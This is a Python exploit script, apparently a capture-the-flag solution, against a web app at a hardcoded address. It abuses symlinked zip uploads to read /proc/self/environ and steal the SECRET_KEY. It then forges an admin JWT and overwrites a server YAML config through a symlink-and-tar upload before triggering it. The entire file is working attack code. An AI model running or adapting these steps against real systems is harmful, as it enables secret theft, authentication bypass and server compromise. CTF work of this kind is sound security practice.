import os
import requests
import re
import jwt
import json
#hostname = "http://localhost:80/"
hostname = "http://103.185.44.122:49047/"

def clean(dir):
    os.system(f"rm -rf {dir}/*")
def getSecret():
    url = hostname + "uploadzip"
    os.chdir('./zip')
    os.system('ln -s /proc/self/environ env.txt')
    os.system("zip --symlink env.zip env.txt")
    res = sendFile(url, "env.zip")
    json_data = res.json()
    dirname = json_data.get("filename", "")
    env = requests.get(f"{hostname}{dirname}/env.txt")
    os.chdir('../')
    pattern = r'SECRET_KEY=([0-9a-f]+)'
    match = re.search(pattern, env.text)
    if match:
        secret_key = match.group(1)
        return secret_key

def sendFile(url, fileName, headers={}):
    files = {"file": (fileName, open(f"{fileName}", "rb"),"application/zip")}
    response = requests.post(url, files=files, headers=headers)
    return response

def forgeJWT(secretKey):
    res = requests.get(hostname + "get/video")
    cookie = res.headers.get('Set-Cookie')
    pattern = r"access_token_cookie=([^;]+)"
    match = re.search(pattern, cookie)
    if match:
        jwt_token = match.group(1)
        print("JWT Token:", jwt_token)

    decoded_token = jwt.decode(jwt_token, secretKey, algorithms=["HS256"])
    new_sub_data = {
         "username": "guest",
         "isAdmin": True,
         "configfile": "exploit4.yaml"
    }
    decoded_token["sub"] = json.dumps(new_sub_data)
    new_token = jwt.encode(decoded_token, secretKey, algorithm="HS256")
    return new_token

def zipSploit():
    url = hostname + "uploadzip"
    os.chdir('./zip')
    os.system("ln -s /app/config/exploit4.yaml exp.yaml")
    os.system("zip --symlink send.zip exp.yaml")
    res = sendFile(url, "./send.zip")

    json_data = res.json()
    filename = json_data.get("filename", "")
    dirname = filename.replace("uploads/", "")
    os.chdir('../')
    return dirname

def tarSploit(dirname, token):
    os.chdir('./tar')
    os.makedirs(dirname, exist_ok=True)
    os.system(f"cp ../exp.yaml {dirname}/exp.yaml")
    os.system(f"tar cvf {dirname}.tar {dirname}")

    res = sendFile(hostname + "uploadtar", f"{dirname}.tar", {"Cookie": "access_token_cookie="+token})
    print(res.text)

def trigger(token):
    url = hostname + "animelist"
    res = requests.get(url, headers={
    "Cookie": "access_token_cookie=" + token
    })
    print(res.text)

def exploit():
    clean('zip')
    clean('tar')
    secret_key = getSecret()
    newJWT = forgeJWT(secret_key)
    dirname = zipSploit()
    tarSploit(dirname, newJWT)
    trigger(newJWT)

exploit()
